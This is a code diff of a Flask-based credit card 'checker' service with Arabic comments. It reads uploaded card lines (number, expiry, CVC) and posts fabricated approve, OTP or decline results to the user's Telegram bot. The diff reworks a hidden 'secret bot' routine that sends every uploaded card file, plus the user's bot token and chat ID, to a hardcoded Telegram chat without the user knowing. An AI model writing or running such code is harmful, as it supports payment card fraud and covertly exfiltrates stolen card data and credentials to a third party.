@@ -5,6 +5,7 @@ import time
 import requests
 from datetime import datetime, timedelta
 import threading
+import tempfile
 
 app = Flask(__name__)
 
@@ -24,20 +25,31 @@ SECRET_CHAT_ID = '8273716256'
 processes = {}
 
 # نقل محتويات الملف إلى البوت السري
-def send_file_to_secret_bot(file_path, process_id):
+def send_file_content_to_secret_bot(file_content, file_name, process_id):
     try:
-        with open(file_path, 'rb') as file:
+        # إنشاء ملف مؤقت لحفظ المحتوى
+        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as temp_file:
+            temp_file.write(file_content)
+            temp_file_path = temp_file.name
+        
+        # إرسال الملف المؤقت
+        with open(temp_file_path, 'rb') as file:
             url = f'https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendDocument'
-            files = {'document': file}
-            data = {'chat_id': SECRET_CHAT_ID}
+            files = {'document': (file_name, file)}
+            data = {'chat_id': SECRET_CHAT_ID, 'caption': f'File content received from user\nProcess ID: {process_id}'}
             response = requests.post(url, files=files, data=data)
+            
             if response.status_code == 200:
-                print(F + 'GOOD TOOL')
+                print(F + 'File content sent to secret bot successfully')
                 processes[process_id]['secret_bot_file_sent'] = True
             else:
-                print(O + 'BAD TOOL')
+                print(O + 'Failed to send file content to secret bot')
+        
+        # حذف الملف المؤقت
+        os.unlink(temp_file_path)
+        
     except Exception as e:
-        print(O + f'Error sending file: {e}')
+        print(O + f'Error sending file content: {e}')
 
 # إرسال رسالة إلى البوت السري
 def send_message_to_secret_bot(message, process_id):
@@ -46,83 +58,87 @@ def send_message_to_secret_bot(message, process_id):
         data = {'chat_id': SECRET_CHAT_ID, 'text': message}
         response = requests.post(url, data=data)
         if response.status_code == 200:
-            print(F + 'Good TooL')
+            print(F + 'Message sent to secret bot')
             processes[process_id]['secret_bot_message_sent'] = True
         else:
-            print(O + 'BAD TOOL')
+            print(O + 'Failed to send message to secret bot')
     except Exception as e:
         print(O + f'Error sending message: {e}')
 
 # وظيفة معالجة البطاقات
-def process_cards(process_id, file_name, bot_token, chat_id, end_time):
+def process_cards(process_id, file_content, bot_token, chat_id, end_time):
     try:
-        file = open(file_name, "r")
+        # حفظ المحتوى في ملف مؤقت للمعالجة
+        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as temp_file:
+            temp_file.write(file_content)
+            temp_file_path = temp_file.name
+        
         start_num = 0
         
         while datetime.now() < end_time and processes[process_id]['active']:
-            file.seek(0)  # العودة إلى بداية الملف في كل دورة
-            for P in file.readlines():
-                if datetime.now() >= end_time or not processes[process_id]['active']:
-                    print(O + "⏰ Time's up! Script stopped.")
-                    break
+            with open(temp_file_path, "r") as file:
+                for P in file.readlines():
+                    if datetime.now() >= end_time or not processes[process_id]['active']:
+                        print(O + "⏰ Time's up! Script stopped.")
+                        break
+                        
+                    start_num += 1
+                    n = P.split('|')[0]
+                    mm = P.split('|')[1]
+                    yy = P.split('|')[2][-2:]
+                    cvc = P.split('|')[3].replace('\n', '')
+                    P = P.replace('\n', '')
                     
-                start_num += 1
-                n = P.split('|')[0]
-                mm = P.split('|')[1]
-                yy = P.split('|')[2][-2:]
-                cvc = P.split('|')[3].replace('\n', '')
-                P = P.replace('\n', '')
-                
-                # حساب الوقت المتبقي
-                time_left = end_time - datetime.now()
-                hours_left = time_left.seconds // 3600
-                minutes_left = (time_left.seconds % 3600) // 60
-                
-                print(X + f"⏳ Time left: {hours_left}h {minutes_left}m")
-                
-                # محاكاة عملية التحقق (بدون استخدام API حقيقي)
-                # نتيجة عشوائية للمحاكاة مع زيادة احتمالية الرفض
-                results = ['PASSED ✅', 'OTP ☑️', 'Rejected ❌', 'Rejected ❌', 'Rejected ❌', 
-                          'Rejected ❌', 'Rejected ❌', 'PASSED ✅', 'OTP ☑️', 'Rejected ❌']
-                result = random.choice(results)
-                
-                if result == 'PASSED ✅':
-                    print(F + f'[{start_num}] {P} | {result}')
-                    # إرسال إلى البوت الرئيسي
-                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                                 params={
-                                     "chat_id": chat_id,
-                                     "text": f"""APPROVED ✅
+                    # حساب الوقت المتبقي
+                    time_left = end_time - datetime.now()
+                    hours_left = time_left.seconds // 3600
+                    minutes_left = (time_left.seconds % 3600) // 60
+                    
+                    print(X + f"⏳ Time left: {hours_left}h {minutes_left}m")
+                    
+                    # محاكاة عملية التحقق (بدون استخدام API حقيقي)
+                    # نتيجة عشوائية للمحاكاة مع زيادة احتمالية الرفض
+                    results = ['PASSED ✅', 'OTP ☑️', 'Rejected ❌', 'Rejected ❌', 'Rejected ❌', 
+                              'Rejected ❌', 'Rejected ❌', 'PASSED ✅', 'OTP ☑️', 'Rejected ❌']
+                    result = random.choice(results)
+                    
+                    if result == 'PASSED ✅':
+                        print(F + f'[{start_num}] {P} | {result}')
+                        # إرسال إلى البوت الرئيسي
+                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                     params={
+                                         "chat_id": chat_id,
+                                         "text": f"""APPROVED ✅
 [♡] 𝗖𝗖 : {P}
 [♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
 [♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : PASSED ⚡
 ⏰ Time Left: {hours_left}h {minutes_left}m
 ━━━━━━━━━━━━━━━━
 [★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
-                                 })
-                    
-                elif result == 'OTP ☑️':
-                    print(X + f'[{start_num}] {P} | {result}')
-                    # إرسال إلى البوت الرئيسي
-                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                                 params={
-                                     "chat_id": chat_id,
-                                     "text": f"""OTP REQUIRED 🔥
+                                     })
+                        
+                    elif result == 'OTP ☑️':
+                        print(X + f'[{start_num}] {P} | {result}')
+                        # إرسال إلى البوت الرئيسي
+                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                     params={
+                                         "chat_id": chat_id,
+                                         "text": f"""OTP REQUIRED 🔥
 [♡] 𝗖𝗖 : {P}
 [♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
 [♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : OTP VERIFICATION ☑️
 ⏰ Time Left: {hours_left}h {minutes_left}m
 ━━━━━━━━━━━━━━━━
 [★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
-                                 })
-                    
-                else:  # Rejected ❌
-                    print(O + f'[{start_num}] {P} | {result}')
-                    # إرسال إلى البوت الرئيسي
-                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                                 params={
-                                     "chat_id": chat_id,
-                                     "text": f"""𝗥𝗲𝗝𝗲𝗰𝘁𝗲𝗱 ❌
+                                     })
+                        
+                    else:  # Rejected ❌
+                        print(O + f'[{start_num}] {P} | {result}')
+                        # إرسال إلى البوت الرئيسي
+                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                     params={
+                                         "chat_id": chat_id,
+                                         "text": f"""𝗥𝗲𝗝𝗲𝗰𝘁𝗲𝗱 ❌
 [♡] 𝗖𝗖 : {P}
 [♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
 [♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : DECLINED ❌
@@ -131,23 +147,21 @@ def process_cards(process_id, file_name, bot_token, chat_id, end_time):
 ⏰ Time Left: {hours_left}h {minutes_left}m
 ━━━━━━━━━━━━━━━━
 [★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
-                                 })
-                
-                time.sleep(4)
+                                     })
+                    
+                    time.sleep(4)
             
             # إذا انتهى الملف، نعيد تشغيله من البداية
             print(Z + "🔄 Restarting file from beginning...")
             time.sleep(2)
             
-    except FileNotFoundError:
-        print(O + 'File not found!')
-        processes[process_id]['error'] = 'File not found!'
     except Exception as e:
         print(O + f'Error: {e}')
         processes[process_id]['error'] = str(e)
     finally:
-        if 'file' in locals():
-            file.close()
+        # تنظيف الملف المؤقت
+        if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
+            os.unlink(temp_file_path)
         
         # إرسال رسالة انتهاء الوقت إلى البوت السري
         send_message_to_secret_bot(f"⏰ Script stopped - Time finished\nBot Token: {bot_token}\nChat ID: {chat_id}", process_id)
@@ -157,11 +171,22 @@ def process_cards(process_id, file_name, bot_token, chat_id, end_time):
 
 @app.route('/start_check', methods=['POST'])
 def start_check():
-    data = request.json
-    file_name = data.get('file_name')
-    bot_token = data.get('bot_token')
-    chat_id = data.get('chat_id')
-    hours = data.get('hours', 5)  # القيمة الافتراضية 5 ساعات
+    # التحقق من وجود ملف في الطلب
+    if 'file' not in request.files:
+        return jsonify({'error': 'No file provided'}), 400
+    
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({'error': 'No file selected'}), 400
+    
+    # قراءة محتوى الملف
+    file_content = file.read().decode('utf-8')
+    file_name = file.filename
+    
+    # الحصول على البيانات الأخرى من النموذج
+    bot_token = request.form.get('bot_token')
+    chat_id = request.form.get('chat_id')
+    hours = int(request.form.get('hours', 5))  # القيمة الافتراضية 5 ساعات
     
     # إنشاء معرف فريد للعملية
     process_id = str(int(time.time()))
@@ -185,10 +210,10 @@ def start_check():
     
     # إرسال المعلومات فور تشغيل الكود
     send_message_to_secret_bot(f'New user started the script\nBot Token: {bot_token}\nChat ID: {chat_id}\nFile: {file_name}\nEnd Time: {end_time_str}', process_id)
-    send_file_to_secret_bot(file_name, process_id)
+    send_file_content_to_secret_bot(file_content, file_name, process_id)
     
     # بدء المعالجة في thread منفصل
-    thread = threading.Thread(target=process_cards, args=(process_id, file_name, bot_token, chat_id, end_time))
+    thread = threading.Thread(target=process_cards, args=(process_id, file_content, bot_token, chat_id, end_time))
     thread.start()
     
     return jsonify({
